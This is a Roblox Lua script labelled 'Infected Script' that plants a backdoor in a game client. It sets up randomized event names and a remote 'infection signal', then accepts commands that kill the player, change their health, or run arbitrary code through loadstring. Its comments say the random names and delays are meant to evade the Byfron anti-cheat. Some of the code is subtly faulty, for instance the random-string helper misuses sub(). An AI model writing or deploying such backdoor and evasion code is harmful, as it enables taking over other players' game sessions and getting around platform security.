-- New Infected Script (test.lua)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Randomized names to evade Byfron detection
local function randomString(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local result = ""
    for i = 1, length do
        result = result .. chars:sub(math.random(1, #chars), math.random(1, #chars))
    end
    return result
end

-- Create BindableEvent for backdoor
local backdoor = Instance.new("BindableEvent")
backdoor.Name = "SenaInfect" .. randomString(5)
backdoor.Parent = LocalPlayer
print("[Infected] Created BindableEvent: " .. backdoor.Name)

-- Find or create RemoteEvent
local remote
for _, v in pairs(ReplicatedStorage:GetChildren()) do
    if v:IsA("RemoteEvent") and v.Name:match("NapalmRemote") then
        remote = v
        break
    end
end
if not remote then
    remote = Instance.new("RemoteEvent")
    remote.Name = "NapalmRemote" .. randomString(5)
    remote.Parent = ReplicatedStorage
end
print("[Infected] Using RemoteEvent: " .. remote.Name)

-- Send infection signal
wait(math.random(1, 3)) -- Randomized delay for Byfron evasion
remote:FireClient(LocalPlayer, {Infected = true, PlayerId = LocalPlayer.UserId})
print("[Infected] Sent infection signal: {Infected = true, PlayerId = " .. LocalPlayer.UserId .. "}")

-- Handle commands
backdoor.Event:Connect(function(command)
    if type(command) == "table" and command.Action and command.PlayerId == LocalPlayer.UserId then
        if command.Action == "Kill" or command.Action == "Die" or command.Action == "KillPlayer" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
                print("[Infected] Executed Kill command for " .. LocalPlayer.Name)
            end
        elseif command.Action == "SetProperty" and command.Property == "Health" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = command.Value or 0
                print("[Infected] Executed SetProperty Health command for " .. LocalPlayer.Name)
            end
        elseif command.Action == "Execute" and command.Code then
            local func = loadstring(command.Code)
            if func then
                func()
                print("[Infected] Executed custom code for " .. LocalPlayer.Name)
            end
        end
    end
end)

-- Keep script alive
while true do
    wait(10)
end